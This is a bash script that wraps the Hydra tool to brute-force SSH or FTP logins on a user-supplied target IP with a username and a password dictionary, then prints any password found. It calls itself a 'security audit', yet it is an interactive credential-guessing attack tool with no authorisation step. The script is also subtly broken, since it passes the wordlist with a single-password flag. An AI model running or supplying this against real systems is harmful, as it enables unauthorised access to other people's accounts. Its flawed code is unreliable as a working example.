#!/bin/bash
#define the colors to be used
no_color='\033[0m'
red='\033[0;31m'
green='\033[0;32m'

# read and create the variables to be used in the script
read -p "Enter the target IP address: " target
read -p "Enter the username: " user
read -p "Enter the dictionary: " dictionary

# check if hydra is installed
if ! command -v hydra &> /dev/null; then
    echo "Hydra is not installed. Would you like to install it? (yes/no): "
    read choice

    if [ "$choice" = 'yes' ]; then
        echo "Attempting to install hydra..."

        # give specific installation command for hydra depending on the system
        # if your system uses apt-get
        sudo apt-get update
        sudo apt-get install hydra

        # if your system uses yum
        # sudo yum install hydra

        # if your system uses pacman
        # sudo pacman -S hydra

        echo "Hydra has been installed. Please run the script again."
        exit 0
    else
        echo "Exiting the script..."
        exit 0
    fi
else
    echo "Hydra is installed"
fi

# check if the dictionary exists
if [ ! -f "$dictionary" ]; then
    echo -e "${red}The file $dictionary does not exist. You must put it inside the current directory${no_color}"
    exit 1
fi

ssh_attack(){
    # Start the bruteforce attack
    echo -e "${green}Starting security audit via SSH on $target ... ${no_color} "
    sleep 2
    output=$(hydra -l "$user" -p "$dictionary" ssh://"$target" -t 4 -vV 2>/dev/null)

    # Check the output
    if echo "$output" | grep -qi "login:\|password:"; then
        password=$(echo "$output" | grep -oP "password: \K.*")
        echo -e "${green} Password found is ${no_color} $password"
    else
        echo -e "${red} Password not found on the archive${no_color}"
        exit 1
    fi
}

ftp_attack(){
    # Start the bruteforce attack
    echo -e "${green}Starting security audit via FTP on $target ... ${no_color} "
    sleep 2
    output=$(hydra -l "$user" -p "$dictionary" ftp://"$target" -t 4 -vV 2>&1)

    # Check the output
    if echo "$output" | grep -qi "login:\|password:"; then
        password=$(echo "$output" | grep -oP "password: \K.*")
        echo -e "${green} Password found is ${no_color} $password"
    else
        echo -e "${red} Password not found on the archive${no_color}"
        exit 1
    fi
}

read -p "Choose if you want to do the attack via SSH or FTP (write SSH or FTP): " choose
if [ "$choose" == "SSH" ]; then
    ssh_attack
elif [ "$choose" == "FTP" ]; then
    ftp_attack
else
    echo -e "${red} You must write SSH or FTP${no_color}"
    exit 1
fi
